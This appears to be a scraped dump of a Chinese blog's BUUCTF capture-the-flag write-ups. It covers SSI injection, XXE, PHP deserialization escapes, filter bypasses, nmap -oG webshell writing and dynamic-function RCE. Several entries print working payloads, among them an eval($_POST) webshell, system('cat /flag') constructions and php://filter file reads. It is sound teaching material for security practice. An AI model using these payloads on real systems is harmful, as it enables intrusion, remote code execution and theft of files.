***\t\t\t***&#x27;;            fwrite($shtml,$text);            fclose($shtml);            ***\t\t\techo &quot;[!] Header  error ...&quot;;        &#125; else &#123;            echo &quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;;                &#125;else    &#123;\t***    &#125;\t***?&gt;\n\n用户名密码判断处发现一个MD5截断比较,反手掏出自己珍藏多年的脚本跑一下\n\n跑到一个,尝试一下.\n\n登陆成功,下一步,这里我就卡住了,没有思路,看了别人的wp:\n\n查看数据包,我们发现一个url,直接访问试试\n\n输出了 用户名 时间戳和IP,观察文件后缀名发现,可能存在ssi注入,抓包尝试\n\n\n没有flag文件返回上级目录看看\n\n得到flag文件名,读取flag\n&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;\n\n\n得到flag.\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"NCTF2019之True XML cookbook","url":"https://husins.cn/NCTF2019之True-XML-cookbook/","content":"知识点\n内网ip的几个文件：/etc/hosts，/proc/net/arp，/proc/net/fib_trieXXE能够攻击内网\n\n解题\n\n打开题目 是一个 登录框 ,首先想到的是sql注入(万能密码)和扫目录,先尝试扫目录\n\n没啥有用信息,尝试sql注入\n\n\n测试了很多数据,都不能成功\n查看源码\n\n有惊喜,他竟然把登录判读写到了源码里面,结合题目所给的信息,应该是XXE-实体注入\n抓取数据包\n\n修改为XXE的实体\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY file SYSTEM  &quot;&quot;&gt;]&gt;&lt;user&gt;  &lt;username&gt;&amp;file;&lt;/username&gt;  &lt;password&gt;hack&lt;/password&gt;&lt;/user&gt;\n\n读取一下当前页面源码\n\n&lt;?php/*** autor: c0ny1* date: 2018-2-7*/$USERNAME = &#x27;admin&#x27;; //账号$PASSWORD = &#x27;024b87931a03f738fff6693ce0a78c88&#x27;; //密码$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);try&#123;\t$dom = new DOMDocument();\t$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\t$creds = simplexml_import_dom($dom);\t$username = $creds-&gt;username;\t$password = $creds-&gt;password;\tif($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;\t\t$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);\t&#125;else&#123;\t\t$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);\t&#125;\t&#125;catch(Exception $e)&#123;\t$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);echo $result;?&gt;\n\n\n用正确账号密码登陆 一下 发现 毫无 意义,思路还是要回到xxe上,这里 开始 我就 不会了,通过看别人的博客,发现XXE竟然可以打内网,\n\n我这里 没有扫到 和别人博客一样的存活主机,\n\n查看路由发现了一个主机\n\n爆破ip得到flag\n[NPUCTF2020]ReadlezPHP知识点\nassert和eval区别:https://blog.csdn.net/ojingzhiyuan12/article/details/88556074\n查看源码是 要注意 隐藏的连接 \n解题\n\n\n这里要细心,看了好几遍 没看到.还去扫了目录.\n\n发现是反序列化,不同的是这里 echo$b($a),因此如果b是一个函数,a是变量,就能产生很多 意想不到的效果.\n因此 构造 paylaod\n\n\n发现啥也没有,看看phpinfo()\n\n\n找到flag\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"WUSTCTF2020之朴实无华","url":"https://husins.cn/WUSTCTF2020之朴实无华/","content":"解题:\n\n打开题目,提示正在被攻击,存在一个警告,不能修改头部信息,已发送头部信息,这些信息没有什么思路\n扫描一下目录,\n\n看一下,robots.txt文件\n\n访问一下这个目录\n\n我中计了,接着看fl4g.php\n\n分析一下给出的源代码\n&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123;   $md5=$_GET[&#x27;md5&#x27;];   if ($md5==md5($md5))       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;   else       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123;    $get_flag = $_GET[&#x27;get_flag&#x27;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;?&gt;\n\n接下来思路就很清晰,绕过三个if得到flag.\n一起来看level 1:intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021\n这里intval()第二个参数没有加,默认解析十进制,所以输入其他进制就会返回0,当后面进行 +1操作的时候,会 转化为十进制在加一\n因此,绕过level 1,只需要找一个十进制比2021 大的非十进制数即可\n构造payload\n?num=0x7e6\n一起再看level 2: $md5==md5($md5)\nmad5的弱类型比较,这里是让一个值本身等于他的MD5加密的值,弱类型比较了就想到科学计数法,这里找一个本身就是0e开头的就好了\n构造\n?num=0x7e6&amp;md5=0e215962017\n一起还看level 3:\n\n不能存在空格\n\ncat 会被替换成wctf2020\n\n命令执行得到flag\n\n\n综上所述,我们需要绕过空格绕过cat读取flag\n\n首先是绕过空格\n\n![image-20201230195901478](https://husins.oss-cn-beijing.aliyuncs.com/20210127114455.png)\n\n使用%09或者$IFS$9代替空格\n\n其次是代替cat\n\n这里选用bat\n构造payload\n?num=0x7e6&amp;md5=0e215962017&amp;get_flag=ls读取当前目录文件\n\n?num=0x7e6&amp;md5=0e215962017&amp;get_flag=bat%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n\n估计是bat命令没有安装,换个命令\n选择more\n\n得到flag,真的是朴实无华呀!\nca*\n[网鼎杯 2020 朱雀组]Nmap知识点\n解题\n\n\n打开题目,简单尝试让我想到了,之前做过的一道题目\n\n利用nmap -oG写入webshell得到flag\npayload&lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG hack.php\n\n提示hacke,怀疑过滤了关键词php\npayload:127.0.0.1&#39; &lt;?= @eval($_POST[&quot;cdm&quot;]);?&gt; -oG cmd.phtml &#39;\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BSidesCF 2020之Had a bad day","url":"https://husins.cn/BSidesCF-2020之Had-a-bad-day/","content":"知识点：\nphp伪协议的参数可以添加无用的，但是整个协议还可以正常使用。\n要注意GET传参和寻常时候不一样的敏感点。\n解题：\n检查题目，没有发现什么功能点，扫一下目录\n\n发现一个flag.php,打开一看，\n\n发现有一句提示，整理一下思路\nindex.php页面没有发现什么有用的功能点,flag.php提示读取这个文件,因此推测,应该是在index.php中通过某种方法,读取flag.php文件\n \n回顾index.php页面,我们发现URL栏中GET传参和平常遇到的不太一样.\n这里就没有什么思路了 ,查看wp发现这里,存在两个可能的点\n\n文件包含或者SQL注入\n\n加上我扫出了flag.php文件,所以推测为是文件包含\n那么就利用php伪协议读取一下flag.php的内容.\n构造payload:\nindex.php?category=php://filter/read=convert.base64-encode/resource=flag.php\n\n发现读取不到,尝试读取index.php文件\n\n这里产生了报错,查看报错信息,我们发现是多出一个.php,应该是读取文件是自动添加.php的后缀\n重新构造payload\nindex.php?category=php://filter/read=convert.base64-encode/resource=index\n\n &lt;?php\t$file = $_GET[&#x27;category&#x27;];\tif(isset($file))&#123;\t\tif( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;\t\t\t\t\t\tinclude ($file . &#x27;.php&#x27;);\t&#125;else&#123;\t\techo &quot;Sorry, we currently only support woofers and meowers.&quot;;\t&#125;&#125;?&gt;\n\n这里 我们发现 文件命里面必须包含woofers或者meowers或者index,所有刚才没有办法直接读取flag.php\n现在的问题是如何在包含这三个字符的条件下读取flag.php\n查看wp发现，其实很简单把这三个字符中的一个当成协议里面的一个参数就好了。\n因此构造payload\nindex.php?category=php://filter/read=convert.base64-encode/index/resource=flag\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"安洵杯 2019之easy_serialize_php","url":"https://husins.cn/安洵杯-2019之easy-serialize-php/","content":"知识点\n**extract()**：将变量从数组中导入当前的符号表，这里就是把post数组里的取出来变成php变量，就比如我们post传a=123,那它经过这个函数就变成了$a=123。而且它默认在变量名冲突的时候进行覆盖，这就导致了变量覆盖漏洞。\n反序列化逃逸吞噬字符串解法。\n解题\n&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123;    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;    return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123;    unset($_SESSION); //销毁session&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function; //为session赋值extract($_POST);if(!$function)&#123;    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123;    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123;    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123;    highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123;    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123;    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125;\n\n这到反序列化，是对$_SESSION这个数组进行序列化，这个数组中的user和function都是可控的但是img不可控，file_get_contents读取的是img的内容。因此思路是，找到要读取的文件，然后通过反序列化漏洞操控img的值，读取flag。\n也就是说base64_decode($userinfo[‘img’])=d0g3_f1ag.php\n\n根据提示查看phpinfo。\n\n仔细浏览，发现一个可以文件，flag应该就在这个文件里面\n下一步就系确定如何控制img的值\n\n这里存在一个filter（）过滤函数，想到反序列逃逸\n这里如果存在fileter_arr的值 就会被替换为空，然后在反序列化的过程中，接着向后读取被替换为空的数量的字符，如果满足，正常反序列化。\n因此构造payload：\n正常的序列化字符串\na:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;i:123;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;\n\n把img换成我们需要的值：\na:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;i:123;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;\n\n得出这样传参得到的序列化字符串\na:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;i:123;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;\n\n利用user吞掉function的值，简介控制img的可得\n_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;\n\n补全三个参数，必须要凑够3个参数，因为一开始序列化的时候指定了有3个参数 \n_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;aa&quot;;s:1:&quot;a&quot;;&#125;\n\n因为存在extract函数存在变量覆盖漏洞。\n传参?f=show_image\npost=_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;s:2:”aa”;s:1:”a”;}\n\n将flag所在文件名base64编码重新传参即可。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"CISCN2019 初赛-Love Math","url":"https://husins.cn/CISCN2019-初赛-Love-Math/","content":"知识点\n\n动态函数php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数例如：$function = &quot;sayHello&quot;;$function();\nphp中函数名默认为字符串例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择\n\n解题\n&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#x27;c&#x27;]))&#123;    show_source(__FILE__);&#125;else&#123;    //例子 c=20-1    $content = $_GET[&#x27;c&#x27;];    if (strlen($content) &gt;= 80) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];    preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    //帮你算出答案    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125;\n\n这道题 采用黑白名单禁用了很多字符，只允许使用白名单中的数学函数，初步思路 是利用白名单的数学函数，制造合适的命令执行。\n预计payload\n?c=system(&quot;cat /flag&quot;)\n\n但是函数只能是白名单里面的，（） ” “   / 都被黑名单禁用。\n“ ”可以去掉，不影响命令执行，利用动态函数的性质可以将payload转化\n?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag\n\n这里只检查c，所以a，b什么样子无所谓接下来只要构造c就可以可以了\n首先a b不能出现，但是可以用白名单里面的函数名称，因为存在长度限制，所以选用尽可能短的\n?c=($_GET[max])($_GET[min])&amp;max=system&amp;min=cat /flag\n\n[]也被和名单禁用 因此我们使用{}\n?c=($_GET&#123;max&#125;)($_GET&#123;min&#125;)&amp;max=system&amp;min=cat /flag\n\n此时我们发现只需要构造_GET就可以了\n通过阅读文档我们发现\n\n\n我们还缺少一个转换为ascii的函数 \n\n\n因此payload可转化为\n?c=($hex2bin(5f474554)&#123;max&#125;)($hex2bin(5f474554)&#123;min&#125;)&amp;max=system&amp;min=cat /flag  \n\n下一步用使用base_convert（）和dechex表示hex2bin和5f474554\n\n\n这里为啥不都使用base_convert这个函数，是因为限制了c的长度压缩长度\n此时payload为：\n?c=($base_convert(37907361743,10,36)(dechex(1598506324))&#123;max&#125;)($base_convert(37907361743,10,36)(dechex(1598506324))&#123;min&#125;)&amp;max=system&amp;min=cat /flag \n\n此时长度过长。选取白名单里面的函数，赋值压缩\n?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;max&#125;(($$pi)&#123;min&#125;)&amp;max=system&amp;min=cat /flag\n\n这里还是太长了，替换变量进一步压缩\n?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;min&#125;)&amp;pi=system&amp;min=cat /flag\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"0CTF 2016之piapiapia","url":"https://husins.cn/0CTF-2016之piapiapia/","content":"知识点:\nstrlen（）函数 判读数组时可绕过对长度的判断\n在目录扫描是 可以尝试 低线程 延时扫描 扫出 多个 只能挨个尝试。\n反序列化逃逸溢出解法。\n解题:\n\n\n\n通过测试不同的数据 产生两种 不同的回显，猜测 是admin 弱密码爆破\n\n爆破一波，并不能成功的爆破出来，接下来的思路是尝试sql注入。\n\n\n诸如此类 尝试了 很多，一点数据库 报错 都没有，放弃SQL注入。F12和返回包也没有提示\n页面也没有其他功能 只能 扫一扫目录了\n\n扫了一波，基本上 字典里面的 状态码 都是 200  没有 办法 也就 148条 挨个 访问。\n访问之后 发现  /regiter.php 和 www.zip 是正常的。 先下载 备份文件看看。\n\n先看看index.php,原来是限制了长度导致的页面不同回显 误导了我。正常登陆之后 跳转到了 profile.php 并且包含了 class.php。\n先看看 包含的class.php文件是什么功能吧。\n&lt;?phprequire(&#x27;config.php&#x27;);class user extends mysql&#123;\tprivate $table = &#x27;users&#x27;;\tpublic function is_exists($username) &#123;\t\t$username = parent::filter($username);\t\t$where = &quot;username = &#x27;$username&#x27;&quot;;\t\treturn parent::select($this-&gt;table, $where);\t&#125;\tpublic function register($username, $password) &#123;\t\t$username = parent::filter($username);\t\t$password = parent::filter($password);\t\t$key_list = Array(&#x27;username&#x27;, &#x27;password&#x27;);\t\t$value_list = Array($username, md5($password));\t\treturn parent::insert($this-&gt;table, $key_list, $value_list);\t&#125;\tpublic function login($username, $password) &#123;\t\t$username = parent::filter($username);\t\t$password = parent::filter($password);\t\t$where = &quot;username = &#x27;$username&#x27;&quot;;\t\t$object = parent::select($this-&gt;table, $where);\t\tif ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;\t\t\treturn true;\t\t&#125; else &#123;\t\t\treturn false;\t\t&#125;\t&#125;\tpublic function show_profile($username) &#123;\t\t$username = parent::filter($username);\t\t$where = &quot;username = &#x27;$username&#x27;&quot;;\t\t$object = parent::select($this-&gt;table, $where);\t\treturn $object-&gt;profile;\t&#125;\tpublic function update_profile($username, $new_profile) &#123;\t\t$username = parent::filter($username);\t\t$new_profile = parent::filter($new_profile);\t\t$where = &quot;username = &#x27;$username&#x27;&quot;;\t\treturn parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where);\t&#125;\tpublic function __tostring() &#123;\t\treturn __class__;\t&#125;&#125;class mysql &#123;\tprivate $link = null;\tpublic function connect($config) &#123;\t\t$this-&gt;link = mysql_connect(\t\t\t$config[&#x27;hostname&#x27;],\t\t\t$config[&#x27;username&#x27;], \t\t\t$config[&#x27;password&#x27;]\t\t);\t\tmysql_select_db($config[&#x27;database&#x27;]);\t\tmysql_query(&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;);\t\treturn $this-&gt;link;\t&#125;\tpublic function select($table, $where, $ret = &#x27;*&#x27;) &#123;\t\t$sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;\t\t$result = mysql_query($sql, $this-&gt;link);\t\treturn mysql_fetch_object($result);\t&#125;\tpublic function insert($table, $key_list, $value_list) &#123;\t\t$key = implode(&#x27;,&#x27;, $key_list);\t\t$value = &#x27;\\&#x27;&#x27; . implode(&#x27;\\&#x27;,\\&#x27;&#x27;, $value_list) . &#x27;\\&#x27;&#x27;; \t\t$sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;\t\treturn mysql_query($sql);\t&#125;\tpublic function update($table, $key, $value, $where) &#123;\t\t$sql = &quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;;\t\treturn mysql_query($sql);\t&#125;\tpublic function filter($string) &#123;\t\t$escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;);\t\t$escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;;\t\t$string = preg_replace($escape, &#x27;_&#x27;, $string);\t\t$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);\t\t$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;\t\treturn preg_replace($safe, &#x27;hacker&#x27;, $string);\t&#125;\tpublic function __tostring() &#123;\t\treturn __class__;\t&#125;&#125;session_start();$user = new user();$user-&gt;connect($config);\n\n通过 类 完成了 用户的增删改查 并且连接了数据库，写的很死，sql注入没啥机会（也可能是我菜）\n里面还包含了个config.php看看他的功能：\n&lt;?php\t$config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;;\t$config[&#x27;username&#x27;] = &#x27;root&#x27;;\t$config[&#x27;password&#x27;] = &#x27;&#x27;;\t$config[&#x27;database&#x27;] = &#x27;&#x27;;\t$flag = &#x27;&#x27;;?&gt;\n\n这里 我们能够看到flag，所以这个题 思路就很明确了，通过XX方法来读取config.php的值，然后得到里面的flag。\n接下来看看 profile.php\n&lt;?php\trequire_once(&#x27;class.php&#x27;);\tif($_SESSION[&#x27;username&#x27;] == null) &#123;\t\tdie(&#x27;Login First&#x27;);\t\t&#125;\t$username = $_SESSION[&#x27;username&#x27;];\t$profile=$user-&gt;show_profile($username);\tif($profile  == null) &#123;\t\theader(&#x27;Location: update.php&#x27;);\t&#125;\telse &#123;\t\t$profile = unserialize($profile);\t\t$phone = $profile[&#x27;phone&#x27;];\t\t$email = $profile[&#x27;email&#x27;];\t\t$nickname = $profile[&#x27;nickname&#x27;];\t\t$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));?&gt;\n\n调用class的用户查询函数，返回值并进行反序列化，这里我们遇到了一个\nfile_get_contents\n\n这个函数，是将整个文件读取到一个字符串中。\n整理一下思路 flag在config.php中，想要得到flag 就要读取 这个文件 ，正好存在 一个函数 可以 将文件内容读取 到字符串中，因此我们现在需要构造$profile的序列化格式中 $profile=config.php,因此进一步看 show_profile()这个函数的功能。就是获取username的值调用filter（）对其进行过滤，是将黑名单里面的值替换成 _ 或者hacker,这里感觉像是之前unctf做的反序列化逃逸\n接下来看看register.php和update.php对用户名 存不存在过滤\n\nregister.php这里限制了用户名的长度,这一下子就给我难住了。没有办法只能 再看看update.php\n&lt;?php\trequire_once(&#x27;class.php&#x27;);\tif($_SESSION[&#x27;username&#x27;] == null) &#123;\t\tdie(&#x27;Login First&#x27;);\t\t&#125;\tif($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123;\t\t$username = $_SESSION[&#x27;username&#x27;];\t\tif(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;]))\t\t\tdie(&#x27;Invalid phone&#x27;);\t\tif(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;]))\t\t\tdie(&#x27;Invalid email&#x27;);\t\t\t\tif(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)\t\t\tdie(&#x27;Invalid nickname&#x27;);\t\t$file = $_FILES[&#x27;photo&#x27;];\t\tif($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000)\t\t\tdie(&#x27;Photo size error&#x27;);\t\tmove_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));\t\t$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];\t\t$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];\t\t$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];\t\t$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);\t\t$user-&gt;update_profile($username, serialize($profile));\t\techo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;;\t&#125;\telse &#123;?&gt;\n\n我们发现这里又多了一个nickname，啊为啥会有两个，去题目页面尝试一下\n\n经过尝试，发现 注册的那个相当于 你的qq号，nickname相当于你的qq名，长度问题迎刃而解。分析一下 update.php对nickname的限制吧。保证nickname都是正常大小写字符加数字 并且长度不大于10，因此结合上述分析，我们应该是利用反序列化逃逸将$profile[‘photo’]的值溢出，传入我们需要的值。并将nickname修改为数组让过strlen函数对长度的检测。\n因此构造payload\nwherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:“photo”;s:10:“config.php”;&#125;\n\n\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BJDCTF 2nd之假猪套天下第","url":"https://husins.cn/BJDCTF-2nd之假猪套天下第/","content":"知识点\nClient-ip可以代替xff\nvia：添加代理服务器\nFrom：邮箱地址\n解题\n\n打开题目 是一个 登陆页面，尝试admin登陆\n\n登陆失败\n\n空值，有被气到，骂他一分钟*****\n随便一个用户名\n可以正常登陆\n\n但是没有 有用 信息，只能思考 这个题 有用信息 在这那 ，在 登录框 抓包 寻找 突破口\n\n发现 提示了个L0g1n.php 看一下吧\n\n说要 99 年 才行。抓包 看看能不能修改时间。\n\n这里 有个时间改为 一个极大值\n\n提示 本地 登陆  使用xff 。\n\nxff不能用，裂开 百度 其他 可以 实现 本地 的方法。\n发现Client-ip也可以。\n\n他可真墨迹，还要 来自浏览器 ，使用 referer头。\n\n需要来自这个 浏览器 真墨迹！！！\n\n修改之后发现 页面 没有 变化 ，名字 不对 百度 一下这个浏览器，我发现 我中计了，原来 还有 全称Commodore 64  \n\n好家伙 还要邮箱地址。 这里 需要 From头。\n\n\n墨迹就算了 还要收费。所以添加代理服务器头！使用Via请求头\n\n base64解码，得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"网鼎杯2020 朱雀组之phpweb","url":"https://husins.cn/网鼎杯2020-朱雀组之phpweb/","content":"知识点\ncall_user_func（）函数的用法，及其功能。\n解题\n\n打开题目 存在 一个警告，还有一个时间戳。\n\n看警告信息，应该是 页面那个时间戳的定义了一个date函数 产生的警告。\nF12查看 数据包，发现 页面是个动态页面，使用burpsuit抓取数据包。\n\n我们 发现 发出包里面存在 两个 参数 ，结合 上面 的 警告信息 我们可以 知道  func是用来 调用函数的，p是用来 输出 时间戳 格式的，结合二者，猜测使用了：call_user_func(函数名，参数)函数\n因此构造payload读取源码\nfunc=file_get_contents&amp;p=index.php\n\n&lt;?php    $disable_fun = 